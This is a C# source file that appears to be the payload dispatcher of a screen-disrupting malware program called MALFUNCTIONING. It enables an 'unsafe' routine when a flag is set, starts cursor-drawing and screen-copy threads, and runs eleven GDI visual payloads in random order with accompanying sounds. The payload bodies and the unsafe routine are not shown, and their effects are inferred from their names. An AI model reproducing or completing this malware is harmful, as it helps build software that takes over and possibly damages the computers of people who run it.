using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static MALFUNCTIONING.api;
using static MALFUNCTIONING.Sounds;
using static MALFUNCTIONING.payloads;
using static MALFUNCTIONING.Variables;
using static MALFUNCTIONING.function;
using System.Windows.Forms.VisualStyles;

namespace MALFUNCTIONING
{
    internal class execute
    {
        public static int payloadsCount = 11;    // 这里修改GDI数量
        public static List<int> remainPayloads = new List<int>();
        public static int Sound = 0;
        public static void Run()
        {
            if (UnsafeMode)
                Unsafe.RunUnsafe();
            NewThread(DrawCur);
            NewThread(ScreenCopy);
            for (int length = 0; length < payloadsCount; length++)
            {
                remainPayloads.Add(length);
            }
            for (int _ = 0; _ < payloadsCount; _++)
            {
                Next();
            }
        }
        public static void Next()
        {
            var temp = Randint(0, remainPayloads.Count - 1);
            Check_Payload(remainPayloads[temp]);
            remainPayloads.RemoveAt(temp);
            Check_Sound(Sound);
            Sound += 1;
        }
        public static void Check_Payload(int index)
        {
            payload = index;
            switch (index)
            {
                case 0:
                    NewThread(GDI1);
                    break;
                case 1:
                    NewThread(GDI2);
                    break;
                case 2:
                    NewThread(GDI3);
                    break;
                case 3:
                    NewThread(GDI4);
                    break;
                case 4:
                    NewThread(GDI5);
                    break;
                case 5:
                    NewThread(GDI6);
                    break;
                case 6:
                    NewThread(GDI7);
                    break;
                case 7:
                    NewThread(GDI8);
                    break;
                case 8:
                    NewThread(GDI9);
                    break;
                case 9:
                    NewThread(GDI10);
                    break;
                case 10:
                    NewThread(GDI11);
                    break;
            }
        }
        public static void Check_Sound(int index)
        {
            switch (index)
            {
                case 0:
                    Sound1();
                    break;
                case 1:
                    Sound2();
                    break;
                case 2:
                    Sound3();
                    break;
                case 3:
                    Sound4();
                    break;
                case 4:
                    Sound5();
                    break;
                case 5:
                    Sound6();
                    break;
                case 6:
                    Sound7();
                    break;
                case 7:
                    Sound8();
                    break;
                case 8:
                    Sound9();
                    break;
                case 9:
                    Sound10();
                    break;
                case 10:
                    Sound11();
                    break;
            }
        }
    }
}
